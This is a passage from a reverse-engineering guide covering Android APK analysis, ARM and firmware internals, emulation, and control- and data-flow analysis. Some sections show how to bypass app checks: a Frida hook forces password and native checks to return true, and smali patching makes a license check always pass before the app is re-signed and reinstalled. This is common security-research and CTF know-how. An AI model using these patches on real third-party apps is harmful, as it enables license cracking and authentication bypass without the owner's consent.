grep "uses-permission" AndroidManifest.xml | grep -E "(INTERNET|SMS|CONTACTS|LOCATION|CAMERA|RECORD_AUDIO)"

# Find exported components (attack surface)
grep "android:exported=\"true\"" AndroidManifest.xml

# Check if debuggable
grep "android:debuggable=\"true\"" AndroidManifest.xml

# Backup allowed (can extract app data via adb)
grep "android:allowBackup" AndroidManifest.xml
```

**Using Drozer for Component Analysis:**

```bash
# List attack surface
drozer console connect
run app.package.attacksurface com.example.app

# List exported activities
run app.activity.info -a com.example.app

# Launch activity with intent
run app.activity.start --component com.example.app/.SecretActivity

# List exported content providers
run app.provider.info -a com.example.app

# Query content provider
run app.provider.query content://com.example.provider/data
```

### Native Library Analysis

**Native Libraries Location:**

```bash
# Libraries per architecture
lib/armeabi-v7a/libnative.so    # 32-bit ARM
lib/arm64-v8a/libnative.so      # 64-bit ARM
lib/x86/libnative.so            # 32-bit x86
lib/x86_64/libnative.so         # 64-bit x86
```

**Analyzing Native Libraries:**

```bash
# Extract and analyze as ELF
unzip app.apk lib/arm64-v8a/libnative.so
file lib/arm64-v8a/libnative.so
# Output: ELF 64-bit LSB shared object, ARM aarch64

# Check exports (JNI functions)
readelf -s lib/arm64-v8a/libnative.so | grep Java_

# Example JNI function name:
# Java_com_example_app_MainActivity_nativeCheckLicense
# Package: com.example.app
# Class: MainActivity
# Method: nativeCheckLicense
```

**JNI Function Signature:**

```c
// Java: public native boolean checkLicense(String key);
// JNI:
JNIEXPORT jboolean JNICALL 
Java_com_example_app_MainActivity_checkLicense(
    JNIEnv *env, 
    jobject thiz,          // 'this' reference
    jstring key)           // String parameter
{
    // Native implementation
}
```

**Disassembling Native Code:**

```bash
# ARM64 disassembly
objdump -d lib/arm64-v8a/libnative.so > disasm.txt

# Load in Ghidra
# File → Import File → Select libnative.so
# Analyze with ARM64 architecture

# Load in IDA Pro
# Supports ARM/ARM64 analysis
```

**Finding JNI_OnLoad:**

```bash
# JNI_OnLoad: Called when library loads
readelf -s libnative.so | grep JNI_OnLoad

# Dynamic registration often happens here
# Decompile JNI_OnLoad to find registered native methods
```

### APK Signing and Verification

**APK Signature Scheme:**

- **v1 (JAR signing)** - META-INF/ folder with signatures
- **v2** - Whole-file signature (faster verification)
- **v3** - Supports key rotation
- **v4** - Incremental updates

**Extracting Certificate:**

```bash
# Extract signing certificate
unzip app.apk META-INF/CERT.RSA
openssl pkcs7 -inform DER -in META-INF/CERT.RSA -print_certs -text -noout

# Using keytool
keytool -printcert -file META-INF/CERT.RSA

# With apksigner
apksigner verify --print-certs app.apk
```

**Signature Information:**

```bash
# Check signature algorithm
apksigner verify -v app.apk

# Verify integrity
jarsigner -verify -verbose -certs app.apk
```

**Self-Signing for Testing:**

```bash
# Generate keystore
keytool -genkey -v -keystore debug.keystore -alias androiddebugkey \
  -keyalg RSA -keysize 2048 -validity 10000

# Sign APK
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
  -keystore debug.keystore app.apk androiddebugkey

# Verify signature
jarsigner -verify -verbose -certs app.apk

# Zipalign (optimize)
zipalign -v 4 app.apk app-aligned.apk
```

### Dynamic Analysis

**Installing and Running:**

```bash
# Install APK
adb install app.apk

# Install over existing (preserve data)
adb install -r app.apk

# Launch app
adb shell am start -n com.example.app/.MainActivity

# View logcat output
adb logcat | grep "com.example"
```

**Debugging:**

```bash
# Enable USB debugging on device
# Settings → Developer Options → USB Debugging

# Forward debugging port
adb forward tcp:8700 jdwp:<pid>

# Attach with jdb
jdb -attach localhost:8700

# Or use Android Studio debugger
# Run → Attach Debugger to Android Process
```

**Runtime Hooking with Frida:**

```bash
# Install Frida server on device
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

# List running apps
frida-ps -U

# Hook Java method
frida -U -f com.example.app -l hook.js --no-pause
```

**Frida Hook Example:**

```javascript
// hook.js - Hook checkPassword method
Java.perform(function() {
    var MainActivity = Java.use('com.example.app.MainActivity');
    
    MainActivity.checkPassword.implementation = function(password) {
        console.log('[+] checkPassword called with: ' + password);
        var result = this.checkPassword(password);
        console.log('[+] Original result: ' + result);
        return true;  // Always return true
    };
    
    // Hook native method
    Interceptor.attach(Module.findExportByName("libnative.so", 
        "Java_com_example_app_MainActivity_nativeCheck"), {
        onEnter: function(args) {
            console.log('[+] Native check called');
            console.log('[+] JNIEnv: ' + args[0]);
            console.log('[+] jobject: ' + args[1]);
        },
        onLeave: function(retval) {
            console.log('[+] Return value: ' + retval);
            retval.replace(1);  // Force return true
        }
    });
});
```

### Modifying and Repackaging APK

**Smali Patching:**

```bash
# 1. Decompile
apktool d app.apk -o app_decoded

# 2. Modify smali files
# Example: Change license check
cd app_decoded/smali/com/example/app/
nano MainActivity.smali

# Find method and modify
# Change: return v0
# To: const/4 v0, 0x1    # Force true
#     return v0

# 3. Recompile
apktool b app_decoded -o app_modified.apk

# 4. Sign
jarsigner -sigalg SHA1withRSA -digestalg SHA1 \
  -keystore ~/.android/debug.keystore \
  app_modified.apk androiddebugkey

# 5. Zipalign
zipalign -v 4 app_modified.apk app_final.apk

# 6. Install
adb install -r app_final.apk
```

**Binary Patching DEX:**

```python
# Patch specific bytes in classes.dex
import struct

with open('classes.dex', 'rb') as f:
    data = bytearray(f.read())

# Example: Change instruction at offset 0x1234
# 0x0e = const/4 instruction
# 0x01 = register v0, value 1
data[0x1234] = 0x0e
data[0x1235] = 0x01

# Update DEX checksum and signature
# [Inference] - Requires recalculating Adler-32 checksum and SHA-1

with open('classes_patched.dex', 'wb') as f:
    f.write(data)
```

### Obfuscation Detection

**ProGuard/R8 Detection:**

```bash
# Obfuscated class names
# Original: com.example.app.MainActivity
# Obfuscated: com.a.b.c

# Check for short/generic names
jadx app.apk
grep -r "class a" output_dir/

# Look for mapping file (sometimes included)
unzip -l app.apk | grep mapping.txt
```

**String Encryption:**

```java
// Common pattern in decompiled code
public String getKey() {
    return StringDecryptor.decrypt("AE3F89B2...");
}

// Find decryption method and reverse it
```

**Control Flow Obfuscation:**

```smali
# Excessive jumps and dead code
:cond_0
if-eqz v0, :cond_1
goto :goto_0

:cond_1
goto :goto_1

:goto_0
# Real code here
```

## Embedded/ARM Binaries

### ARM Architecture Overview

**ARM Registers (32-bit):**

- **R0-R12** - General purpose
- **R13 (SP)** - Stack pointer
- **R14 (LR)** - Link register (return address)
- **R15 (PC)** - Program counter
- **CPSR** - Current Program Status Register

**ARM64 (AArch64) Registers:**

- **X0-X30** - 64-bit general purpose (W0-W30 for 32-bit access)
- **X29 (FP)** - Frame pointer
- **X30 (LR)** - Link register
- **SP** - Stack pointer
- **PC** - Program counter

### ARM vs THUMB Mode

**ARM Mode:**

- 32-bit fixed instruction length
- Full instruction set
- Better performance for computation-heavy code

**THUMB Mode:**

- 16-bit variable instruction length
- Subset of ARM instructions
- Better code density (smaller binaries)

**THUMB-2:**

- Mix of 16-bit and 32-bit instructions
- Combines density of THUMB with power of ARM

**Mode Identification:**

```bash
# Check if binary contains THUMB code
readelf -h firmware.elf | grep Flags
# Output may indicate: has entry point = 0x8001 (odd = THUMB mode)

# Objdump with architecture
arm-none-eabi-objdump -d -marm firmware.elf
arm-none-eabi-objdump -d -mthumb firmware.elf

# Automatic detection
file firmware.bin
```

**Mode Switching Recognition:**

```arm
; ARM to THUMB
BX lr              ; Branch and exchange - switches mode based on LSB of LR
BLX label          ; Branch with link and exchange

; In disassembly, odd addresses indicate THUMB
; 0x8000: ARM instruction
; 0x8001: THUMB instruction (bit 0 set)
```

**THUMB Instruction Examples:**

```arm
; THUMB-1 (16-bit)
MOVS r0, #5        ; Move immediate to register
ADDS r1, r0, r2    ; Add registers
B label            ; Branch

; THUMB-2 (32-bit)
MOV.W r0, #0x1234  ; Wide move instruction
LDR.W r0, [r1]     ; Wide load
```

**Identifying Mode in IDA/Ghidra:**

```bash
# IDA Pro
# Right-click instruction → Change segment register value
# T (THUMB state) = 0 (ARM) or 1 (THUMB)

# Ghidra
# Right-click → Processor Options
# Check TMode register value
# Even address + TMode=1 = THUMB
```

### ARM Calling Conventions (AAPCS)

**Argument Passing:**

- **R0-R3** - First 4 arguments
- **Stack** - Additional arguments (pushed right-to-left)
- **R0** - Return value (R0-R1 for 64-bit)

**Callee-Saved Registers:**

- **R4-R11** - Must be preserved
- **R13 (SP)** - Must be preserved
- **R14 (LR)** - May be modified

**Stack Alignment:**

- Stack must be 8-byte aligned at function entry
- Some functions require 16-byte alignment (NEON)

**Example Function:**

```arm
; int add(int a, int b, int c, int d, int e)
; R0 = a, R1 = b, R2 = c, R3 = d
; Stack[0] = e (5th argument)

add:
    PUSH {r4, lr}          ; Save callee-saved registers
    ADD r0, r0, r1         ; a + b
    ADD r0, r0, r2         ; + c
    ADD r0, r0, r3         ; + d
    LDR r4, [sp, #8]       ; Load e from stack (after push)
    ADD r0, r0, r4         ; + e
    POP {r4, pc}           ; Restore and return
```

### ARM64 (AArch64) Calling Convention

**Argument Passing:**

- **X0-X7** - First 8 arguments (integer/pointer)
- **V0-V7** - Floating point arguments
- **Stack** - Additional arguments
- **X0** - Return value

**Callee-Saved Registers:**

- **X19-X28** - Must be preserved
- **X29 (FP)** - Frame pointer
- **X30 (LR)** - Link register

**Example ARM64 Function:**

```arm64
; void process(int *array, int size)
; X0 = array, X1 = size

process:
    STP x29, x30, [sp, #-32]!  ; Push FP and LR
    MOV x29, sp                 ; Set frame pointer
    STP x19, x20, [sp, #16]     ; Save callee-saved regs
    
    MOV x19, x0                 ; x19 = array
    MOV x20, x1                 ; x20 = size
    
    ; Function body
    
    LDP x19, x20, [sp, #16]     ; Restore registers
    LDP x29, x30, [sp], #32     ; Pop FP and LR
    RET                          ; Return to X30
```

### Common ARM Instructions

**Data Processing:**

|Instruction|Description|Example|
|---|---|---|
|MOV|Move|`MOV r0, r1`|
|ADD|Add|`ADD r0, r1, r2` ; r0 = r1 + r2|
|SUB|Subtract|`SUB r0, r1, #4` ; r0 = r1 - 4|
|MUL|Multiply|`MUL r0, r1, r2`|
|AND|Bitwise AND|`AND r0, r1, r2`|
|ORR|Bitwise OR|`ORR r0, r1, r2`|
|EOR|Bitwise XOR|`EOR r0, r1, r2`|
|LSL|Logical shift left|`LSL r0, r1, #2`|
|LSR|Logical shift right|`LSR r0, r1, #2`|
|CMP|Compare|`CMP r0, r1` ; sets flags|

**Memory Operations:**

|Instruction|Description|Example|
|---|---|---|
|LDR|Load register|`LDR r0, [r1]` ; r0 = *r1|
|LDRB|Load byte|`LDRB r0, [r1]` ; r0 = _(uint8_t_)r1|
|LDRH|Load halfword|`LDRH r0, [r1]` ; r0 = _(uint16_t_)r1|
|STR|Store register|`STR r0, [r1]` ; *r1 = r0|
|STRB|Store byte|`STRB r0, [r1]`|
|LDM|Load multiple|`LDMIA r0!, {r1-r4}`|
|STM|Store multiple|`STMDB r0!, {r1-r4}`|
|PUSH|Push to stack|`PUSH {r0-r3}`|
|POP|Pop from stack|`POP {r0-r3}`|

**Control Flow:**

|Instruction|Description|Example|
|---|---|---|
|B|Branch|`B label`|
|BL|Branch with link|`BL function` ; LR = return addr|
|BX|Branch and exchange|`BX lr` ; return, may switch mode|
|BLX|Branch, link, exchange|`BLX function`|
|BEQ|Branch if equal|`BEQ label` ; if Z flag set|
|BNE|Branch if not equal|`BNE label` ; if Z flag clear|
|BLT|Branch if less than|`BLT label` ; signed <|
|BGT|Branch if greater|`BGT label` ; signed >|
|BLE|Branch if less/equal|`BLE label`|
|BGE|Branch if greater/equal|`BGE label`|

**Condition Codes:**

- **EQ** - Equal (Z set)
- **NE** - Not equal (Z clear)
- **LT** - Less than (signed)
- **LE** - Less or equal (signed)
- **GT** - Greater than (signed)
- **GE** - Greater or equal (signed)
- **CS/HS** - Carry set / unsigned higher or same
- **CC/LO** - Carry clear / unsigned lower

### Identifying Architecture

**Determining ARM Version:**

```bash
# Method 1: file command
file firmware.bin
# ARM, MIPS, PowerPC, etc.

# Method 2: readelf
readelf -h firmware.elf | grep Machine
# ARM, AArch64, etc.

# Method 3: Magic bytes analysis
hexdump -C firmware.bin | head
# Look for ARM instruction patterns

# Method 4: strings
strings firmware.bin | grep -i "arm\|thumb\|cortex"
```

**Endianness Detection:**

```bash
# ARM can be little-endian or big-endian
readelf -h firmware.elf | grep Data
# Output: 2's complement, little endian

# In IDA/Ghidra
# Options → General → Processor type
# Check endianness setting
```

### Firmware Analysis

**Common Firmware Formats:**

- **Raw binary** - No headers, direct memory image
- **ELF** - Standard executable format
- **Intel HEX** - ASCII hex format (`.hex`)
- **Motorola S-record** - Alternative hex format (`.srec`)
- **UBI/UBIFS** - Flash filesystem
- **SquashFS** - Compressed read-only filesystem

**Extracting Firmware:**

```bash
# Binwalk - identify embedded files
binwalk firmware.bin

# Extract all found files
binwalk -e firmware.bin

# Extract specific filesystem
binwalk -D 'squashfs:squashfs' firmware.bin

# Manual extraction
dd if=firmware.bin of=extracted.squashfs bs=1 skip=<offset> count=<size>
```

**Mounting Extracted Filesystem:**

```bash
# SquashFS
unsquashfs filesystem.squashfs

# UBIFS (requires UBI image)
modprobe nandsim
modprobe ubi
modprobe ubifs
ubiformat /dev/mtd0 -f firmware.ubi
ubiattach -p /dev/mtd0
mount -t ubifs /dev/ubi0_0 /mnt/firmware

# JFFS2
modprobe mtdblock
modprobe jffs2
modprobe mtdram
mount -t jffs2 /dev/mtdblock0 /mnt/firmware
```

**Finding Entry Point (No Headers):**

```bash
# Look for reset vector (typically at 0x00 or 0x04)
# ARM Cortex-M: Vector table at 0x00
# First entry: Initial SP value
# Second entry: Reset handler address

hexdump -C firmware.bin | head -n 2
# 00000000  00 10 00 20 c1 00 00 08  ...
#           ^^^^^^^^^ SP  ^^^^^^^^^ Reset handler (0x080000c1, THUMB mode)

# Load in Ghidra
# Define vector table structure
# Create code at reset handler address
```

### Memory-Mapped Peripherals

**Common Peripheral Addresses:**

```c
// STM32 Example (vendor-specific)
#define GPIOA_BASE   0x40020000
#define USART1_BASE  0x40011000
#define TIM1_BASE    0x40010000

// Identifying peripheral access
LDR r0, =0x40020000    ; Load peripheral base
LDR r1, [r0, #0x14]    ; Read from offset 0x14
ORR r1, r1, #0x01      ; Set bit 0
STR r1, [r0, #0x14]    ; Write back
```

**Recognizing MMIO Patterns:**

```arm
; Repeated access to fixed addresses
LDR r0, =0x40020018    ; Fixed address
LDR r1, [r0]
TST r1, #0x01          ; Test bit
BEQ wait_loop          ; Poll until set
```

**Datasheet Correlation:**

- Identify chip from strings/markings
- Download vendor datasheet
- Match addresses to peripheral names
- Understand register bit fields

### NEON SIMD Instructions

**NEON (Advanced SIMD):**

- Vector processing for ARM
- 128-bit registers (Q0-Q15)
- Can be viewed as:
    - 16 × 8-bit
    - 8 × 16-bit
    - 4 × 32-bit
    - 2 × 64-bit

**Common NEON Instructions:**

```arm
; Load/Store
VLD1.8 {d0}, [r0]      ; Load 8 bytes into D0
VST1.32 {q0}, [r1]     ; Store Q0 (16 bytes)

; Arithmetic
VADD.I32 q0, q1, q2    ; Vector add (4 × 32-bit)
VMUL.I16 q0, q1, q2    ; Vector multiply (8 × 16-bit)

; Comparison
VCEQ.I32 q0, q1, q2    ; Compare equal
```

**Identifying NEON:**

```bash
# NEON instructions in objdump
arm-none-eabi-objdump -d firmware.elf | grep -E "v(ld|st|add|mul)"

# In IDA/Ghidra
# Look for 'V' prefix instructions
# Often used in cryptography, media processing
```

### Debugging Embedded Binaries

**QEMU Emulation:**

```bash
# ARM user-mode emulation
qemu-arm -L /usr/arm-linux-gnueabihf/ ./arm_binary

# Full system emulation (requires kernel)
qemu-system-arm -M versatilepb -kernel zImage -dtb versatile-pb.dtb \
  -drive file=rootfs.ext2,if=scsi,format=raw -append "root=/dev/sda" \
  -s -S  # GDB server on port 1234

# Connect with GDB
gdb-multiarch
target remote localhost:1234
```

**Hardware Debugging (JTAG/SWD):**

```bash
# OpenOCD configuration
openocd -f interface/stlink-v2.cfg -f target/stm32f4x.cfg

# GDB connection
arm-none-eabi-gdb firmware.elf
target extended-remote localhost:3333
monitor reset halt
load
continue
```

**Unicorn Engine Emulation:**

```python
from unicorn import *
from unicorn.arm_const import *

# Initialize emulator
mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB)

# Map memory
mu.mem_map(0x8000, 2 * 1024 * 1024)  # 2MB at 0x8000

# Load binary
with open('firmware.bin', 'rb') as f:
    code = f.read()
mu.mem_write(0x8000, code)

# Set registers
mu.reg_write(UC_ARM_REG_SP, 0x20000000)
mu.reg_write(UC_ARM_REG_R0, 0x1234)

# Hook code execution
def hook_code(uc, address, size, user_data):
    print(f">>> Executing at 0x{address:x}")

mu.hook_add(UC_HOOK_CODE, hook_code)

# Emulate
mu.emu_start(0x8001, 0x8100)  # THUMB mode (odd address)

# Read register
r0 = mu.reg_read(UC_ARM_REG_R0)
print(f"R0 = 0x{r0:x}")
```

### Cross-Compilation Toolchains

**Installing Toolchains:**

```bash
# ARM 32-bit
sudo apt install gcc-arm-linux-gnueabihf binutils-arm-linux-gnueabihf

# ARM 64-bit
sudo apt install gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu

# Bare-metal ARM (Cortex-M)
sudo apt install gcc-arm-none-eabi binutils-arm-none-eabi

# MIPS
sudo apt install gcc-mips-linux-gnu binutils-mips-linux-gnu
```

**Cross-Compiling:**

```bash
# ARM 32-bit
arm-linux-gnueabihf-gcc -o program program.c

# ARM 64-bit
aarch64-linux-gnu-gcc -o program program.c

# Bare-metal (Cortex-M)
arm-none-eabi-gcc -mcpu=cortex-m4 -mthumb -o firmware.elf startup.s main.c
```

**Disassembly Tools:**

```bash
# objdump
arm-none-eabi-objdump -d firmware.elf

# Specify architecture if no headers
arm-none-eabi-objdump -D -b binary -marm firmware.bin
arm-none-eabi-objdump -D -b binary -mthumb firmware.bin

# capstone disassembler
cstool arm firmware.bin    # ARM mode
cstool thumb firmware.bin  # THUMB mode
```

## Important Related Topics

**Format String Vulnerabilities in Platform Context:** Exploiting printf-family functions across ELF and PE, GOT overwrites via %n, bypassing ASLR through information leaks

**Kernel Module Analysis:** `.ko` files (Linux kernel modules), driver analysis in Windows (`.sys` files), ARM TrustZone secure world binaries

**Return-Oriented Programming (ROP) Platform-Specifics:** ROP gadget finding with ROPgadget/ropper, differences in gadget availability between x86/x64/ARM, syscall/interrupt invocation patterns

**Binary Instrumentation Frameworks:** Intel Pin, DynamoRIO for x86/x64, Frida for multi-platform hooking including ARM, QEMU TCG plugins for custom instrumentation

**Advanced Android Security:** SELinux policy analysis, Zygote process inspection, ART (Android Runtime) internals, certificate pinning bypass techniques, root detection mechanisms

**IoT Protocol Analysis:** MQTT, CoAP, Zigbee traffic inspection, firmware encryption schemes, hardware attack surfaces (UART, JTAG), side-channel attacks on embedded crypto

---

# Reverse Engineering Workflows

## Identifying Main Entry Point

### Entry Point Location Methods

**ELF Binaries (Linux)**

```bash
# Readelf - view entry point address
readelf -h binary | grep Entry
readelf -h binary
# Output: Entry point address: 0x401040

# Objdump - disassemble from entry
objdump -d binary | grep "<_start>:" -A 20

# rabin2 (radare2 suite)
rabin2 -e binary
rabin2 -E binary  # All entry points including constructors

# GDB - examine entry
gdb binary
(gdb) info files
(gdb) b *0x401040
```

**PE Binaries (Windows)**

```bash
# pefile (Python)
python3 -c "import pefile; pe=pefile.PE('binary.exe'); print(hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint + pe.OPTIONAL_HEADER.ImageBase))"

# radare2
r2 binary.exe
[0x00000000]> ie  # info entrypoints
[0x00000000]> iE  # all entrypoints

# Ghidra
# Window → Defined Strings → Filter "entry"
# Or check Symbol Tree → Functions → "entry"

# objdump
objdump -f binary.exe | grep "start address"
```

**Non-Standard Entry Points**

- **TLS callbacks**: Execute before main entry point in PE files
    
    ```bash
    # Detect TLS callbacksrabin2 -I binary.exe | grep tls# In Ghidra: Window → Memory Map → .tls section
    ```
    
- **Init arrays** (.init_array section in ELF): Functions run before main
    
    ```bash
    readelf -S binary | grep init_arrayobjdump -s -j .init_array binary
    ```
    
- **Constructors**: C++ global object constructors
    
    ```bash
    # Check for __libc_csu_init or _init functionsnm binary | grep -i init
    ```
    

### Distinguishing Real vs Stub Entry Points

**CRT Startup Code Recognition**

- ELF `_start` typically calls `__libc_start_main(main, argc, argv, ...)`
- Look for push/mov operations setting up main's arguments
- Real main function usually follows recognizable patterns (stack frame setup, local variable allocation)

```bash
# Trace from _start to main
gdb binary
(gdb) b _start
(gdb) run
(gdb) disas
# Look for call to __libc_start_main, first argument is main address
```

## Function Boundary Detection

### Signature-Based Detection

**Prologue Patterns**

```nasm
; x86/x86-64 common prologues
push ebp / push rbp
mov ebp, esp / mov rbp, rsp
sub esp, 0xNN / sub rsp, 0xNN

; Alternative compact prologue
enter 0xNN, 0

; Function with frame pointer omission (-fomit-frame-pointer)
sub esp, 0xNN
push ebx
push esi
```

**Epilogue Patterns**

```nasm
; Standard epilogue
mov esp, ebp / mov rsp, rbp
pop ebp / pop rbp
ret / retn 0xNN

; Alternative
leave
ret

; Tail call (no epilogue)
jmp target_function
```

### Tool-Assisted Function Detection

**IDA Pro**

```
Options → General → Analysis → Functions
- Function chunking enabled
- Stack variables analysis
- Reanalyze program (Edit → Functions → Reanalyze program)
```

**Ghidra**

```bash
# Auto-analysis typically detects most functions
# Manual function creation:
# Right-click → Create Function (F)
# Or: Analysis → Auto Analyze → Function Start Search

# Script-based detection
# Window → Script Manager → Search "function"
```

**radare2**

```bash
r2 -A binary  # Analyze all
[0x00000000]> afl  # list functions
[0x00000000]> afr  # analyze function recursively
[0x00000000]> aa   # analyze all
[0x00000000]> aaa  # analyze all (deeper)
[0x00000000]> aaaa # analyze all (experimental)

# Manual function definition
[0x00000000]> af @ 0x401234  # define function at address
```

**Binary Ninja**

- Functions auto-detected during linear sweep + recursive descent
- View → Linear View / View → Graph View
- Manual: Right-click → Make Function

### Handling Obfuscated Function Boundaries

**Stripped Binaries**

- No symbol information; rely on heuristics
- Cross-references help identify function starts (calls/jumps to address)
    
    ```bash
    # radare2 cross-references[0x00000000]> axt @ address  # xrefs to[0x00000000]> axf @ address  # xrefs from
    ```
    

**Non-Standard Calling Conventions**

- Fastcall, thiscall, custom conventions may lack standard prologue
- Identify by analyzing parameter passing (registers vs stack)

**Position-Independent Code (PIE)**

```bash
# Check if PIE enabled
readelf -h binary | grep Type
# Type: DYN (Shared object file) indicates PIE

# Addresses are relative; adjust during analysis
```

## Control Flow Graph Reconstruction

### CFG Generation Tools

**Ghidra**

- Graph view automatically generated per function
- Window → Function Graph
- Export: File → Export Program → Format: PNG/SVG

**IDA Pro**

```
View → Open subviews → Flow chart
Options → General → Graph → Adjust layout settings
```

**radare2 + r2ghidra**

```bash
r2 -A binary
[0x00000000]> s main
[0x00401234]> VV  # visual graph mode
[0x00401234]> agf  # ascii graph function
[0x00401234]> agfd > cfg.dot  # export to graphviz
dot -Tpng cfg.dot -o cfg.png
```

**angr (Python)**

```python
import angr
proj = angr.Project('binary', auto_load_libs=False)
cfg = proj.analyses.CFGFast()  # Fast CFG
# or
cfg = proj.analyses.CFGEmulated()  # More accurate, slower

# Access basic blocks
func = cfg.functions['main']
for block in func.blocks:
    print(f"Block: {hex(block.addr)}, Size: {block.size}")

# Visualize
import matplotlib.pyplot as plt
func.graph.plot(plt)
```

**Binary Ninja**

```python
# Python API
import binaryninja as bn
bv = bn.open_view('binary')
func = bv.get_function_at(0x401234)

# Iterate basic blocks
for bb in func.basic_blocks:
    print(f"Block: {hex(bb.start)} -> {hex(bb.end)}")
    for edge in bb.outgoing_edges:
        print(f"  -> {hex(edge.target.start)}")
```

### CFG Analysis Techniques

**Basic Block Identification**

- Basic block: maximal sequence of instructions with single entry/exit
- Leaders: first instruction, targets of jumps, instructions after jumps
- Terminators: jump, call, return instructions

**Edge Classification**

- **Conditional branches**: Two outgoing edges (true/false)
- **Unconditional jumps**: Single outgoing edge
- **Call edges**: Function invocation (may return)
- **Return edges**: Exit function
- **Indirect jumps/calls**: Computed targets (switch statements, function pointers)

**Handling Indirect Control Flow**

```bash
# radare2 - analyze indirect jumps
[0x00401234]> afi  # function info including indirect jumps
[0x00401234]> afvd  # detect and analyze switch tables

# Manual switch table analysis
# 1. Identify jump table base address
# 2. Determine number of cases
# 3. Calculate target addresses
[0x00401234]> px @ [jumptable_addr]
```

**Unreachable Code Detection**

- Code not in CFG = dead code or obfuscation
- Check for opaque predicates: always true/false conditionals

```python
# angr - detect unreachable code
cfg = proj.analyses.CFGFast()
all_funcs = cfg.functions.values()
reachable_addrs = {block.addr for func in all_funcs for block in func.blocks}

# Compare with all executable sections
```

### CFG Reconstruction Challenges

**Exception Handling**

- C++ try/catch blocks create hidden control flow
- Check for exception tables in `.eh_frame` section
    
    ```bash
    readelf -wF binary  # Display exception handling frames
    ```
    

**Setjmp/Longjmp**

- Non-local jumps disrupt linear CFG
- Difficult to reconstruct statically; may require dynamic analysis

**Self-Modifying Code**

- Code that modifies itself during execution
- Static CFG incomplete; use dynamic instrumentation (PIN, DynamoRIO)

**Code Obfuscation Techniques**

- Control flow flattening: all blocks go through central dispatcher
- Opaque predicates: fake conditional branches
- [Inference] Requires pattern recognition or simplification passes

## Data Flow Analysis

### Reaching Definitions Analysis

**Concept**: Determine which definitions of variables reach each program point

```python
# Binary Ninja Medium-Level IL (MLIL) data flow
import binaryninja as bn
bv = bn.open_view('binary')
func = bv.get_function_at(0x401234)

for bb in func.mlil.basic_blocks:
    for instr in bb:
        # Check definitions reaching this instruction
        for var in instr.vars_read:
            definitions = func.mlil.get_var_definitions(var)
            print(f"Variable {var} defined at: {[hex(d.address) for d in definitions]}")
```

**Use-Definition Chains (UD-Chains)**

- Link each use of a variable to all possible definitions
- Critical for understanding data dependencies

```bash
# Ghidra data flow
# Right-click variable → References → Show
# Or: Search → For Data... → Select variable
```

### Taint Analysis

**Forward Taint Propagation**

- Mark input sources as tainted
- Track taint through operations
- Identify where tainted data reaches sensitive sinks

```python
# angr taint analysis example
import angr
proj = angr.Project('binary', auto_load_libs=False)

# Define taint source (e.g., read syscall buffer)
state = proj.factory.entry_state()
taint_addr = 0x601000
state.memory.store(taint_addr, state.solver.BVS('tainted_input', 64*8))

# Symbolic execution
simgr = proj.factory.simulation_manager(state)
simgr.run()

# Check taint at sensitive operations
for deadended_state in simgr.deadended:
    if deadended_state.satisfiable():
        # Check if tainted data reached critical operation
        pass
```

**Backward Slicing**

- Given target instruction, find all instructions affecting it
- Useful for understanding vulnerability inputs

```bash
# radare2 backward slicing (manual)
# 1. Identify target instruction
# 2. Find all xrefs to registers/memory used
# 3. Recursively trace back

[0x00401234]> pd 10 @ sym.vulnerable_func
[0x00401234]> afvd  # analyze variable dependencies
```

### Register and Memory Tracking

**Symbolic Execution for Data Flow**

```python
# angr symbolic execution
import angr, claripy

proj = angr.Project('binary', auto_load_libs=False)
state = proj.factory.entry_state()

# Make input symbolic
symbolic_input = claripy.BVS('user_input', 8*32)  # 32 bytes
state.memory.store(0x601000, symbolic_input)

# Execute and track constraints
simgr = proj.factory.simulation_manager(state)
simgr.run()

for found in simgr.deadended:
    # Query constraints on symbolic input
    if found.satisfiable(extra_constraints=[found.regs.eax == 0x1337]):
        solution = found.solver.eval(symbolic_input)
        print(f"Input to reach target: {solution}")
```

**SSA (Static Single Assignment) Form**

- Each variable assigned exactly once
- Phi functions at merge points
- [Inference] Available in Ghidra's P-code and Binary Ninja's MLIL/HLIL

```python
# Binary Ninja SSA form
func = bv.get_function_at(0x401234)
for bb in func.mlil.ssa_form.basic_blocks:
    for instr in bb:
        print(f"{hex(instr.address)}: {instr}")
        # Variables in SSA form have version numbers
```

### Alias Analysis

**Determining Pointer Relationships**

- May-alias: pointers might point to same location
- Must-alias: pointers definitely point to same location
- [Unverified] Most binary analysis tools use flow-insensitive alias analysis

**Challenges in Binary Analysis**

- Type information lost after compilation
- Pointer arithmetic difficult to track precisely
- Indirect memory accesses through registers

```bash
# Manual pointer tracking in Ghidra
# 1. Set data type for pointer variable
# Right-click → Retype Variable → pointer type
# 2. Use cross-references
# Right-click → References → Show References to Address
```

## Loop Analysis and Pattern Recognition

### Loop Detection Algorithms

**Natural Loops in CFG**

- Back edge: edge whose target dominates its source
- Natural loop: nodes reachable from back edge target without leaving loop

```python
# NetworkX-based loop detection
import networkx as nx

def find_loops(cfg_graph):
    """
    cfg_graph: NetworkX DiGraph with basic blocks as nodes
    """
    # Find strongly connected components
    sccs = list(nx.strongly_connected_components(cfg_graph))
    
    loops = []
    for scc in sccs:
        if len(scc) > 1 or (len(scc) == 1 and list(scc)[0] in cfg_graph.successors(list(scc)[0])):
            loops.append(scc)
    
    return loops
```

**Binary Ninja Loop Detection**

```python
func = bv.get_function_at(0x401234)
for bb in func.basic_blocks:
    if bb.has_undetermined_outgoing_edges:
        print(f"Potential loop at {hex(bb.start)}")
    
    # Check for back edges
    for edge in bb.outgoing_edges:
        if edge.back_edge:
            print(f"Back edge: {hex(bb.start)} -> {hex(edge.target.start)}")
```

### Loop Structure Recognition

**Counting Loops (for-loops)**

```nasm
; Typical pattern
    mov ecx, 0          ; loop counter initialization
.loop_start:
    cmp ecx, 10         ; loop condition
    jge .loop_end
    ; loop body
    inc ecx             ; counter increment
    jmp .loop_start
.loop_end:
```

**Conditional Loops (while/do-while)**

```nasm
; while-loop
.loop_start:
    test eax, eax       ; condition check
    jz .loop_end
    ; loop body
    jmp .loop_start
.loop_end:

; do-while loop
.loop_start:
    ; loop body
    test eax, eax       ; condition at end
    jnz .loop_start
```

**Nested Loop Detection**

- Inner loop's back edge target dominates outer loop's back edge source
- Multiple loop counters/induction variables

```bash
# Ghidra loop identification
# Function Graph shows loop structures with back edges
